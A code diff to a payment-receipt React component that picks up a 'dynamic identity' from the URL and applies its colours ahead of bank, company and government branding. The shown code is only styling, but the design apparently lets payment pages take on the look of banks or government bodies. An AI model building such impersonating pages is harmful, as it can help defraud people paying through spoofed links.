@@ -15,11 +15,17 @@ import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { getBankById } from "@/lib/banks";
 import { getCompanyLayout } from "@/components/CompanyLayouts";
 import { getGovernmentLayout } from "@/components/GovernmentLayouts";
+import { detectEntityFromURL, getEntityIdentity } from "@/lib/dynamicIdentity";
+import { useAutoApplyIdentity } from "@/hooks/useAutoApplyIdentity";
+import { useDynamicIdentity } from "@/components/DynamicIdentityProvider";
 
 const PaymentReceipt = () => {
   const { paymentId } = useParams();
   const { data: payment } = usePayment(paymentId);
   const { data: link } = useLink(payment?.link_id || undefined);
+
+  useAutoApplyIdentity();
+  const { identity: dynamicIdentity } = useDynamicIdentity();
   
   if (!payment || !link) {
     return (
@@ -43,8 +49,8 @@ const PaymentReceipt = () => {
   const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
   const selectedBankBranding = selectedBankId && selectedBankId !== 'skipped' ? bankBranding[selectedBankId] : null;
   
-  const primaryColor = selectedBankBranding?.colors?.primary || companyBranding?.colors.primary || branding.colors.primary;
-  const secondaryColor = selectedBankBranding?.colors?.secondary || companyBranding?.colors.secondary || branding.colors.secondary;
+  const primaryColor = dynamicIdentity?.colors?.primary || selectedBankBranding?.colors?.primary || companyBranding?.colors.primary || branding.colors.primary;
+  const secondaryColor = dynamicIdentity?.colors?.secondary || selectedBankBranding?.colors?.secondary || companyBranding?.colors.secondary || branding.colors.secondary;
   
   const formattedAmount = formatCurrency(payment.amount, link.country_code);
   const formattedDate = new Date(payment.created_at).toLocaleDateString('ar-SA', {
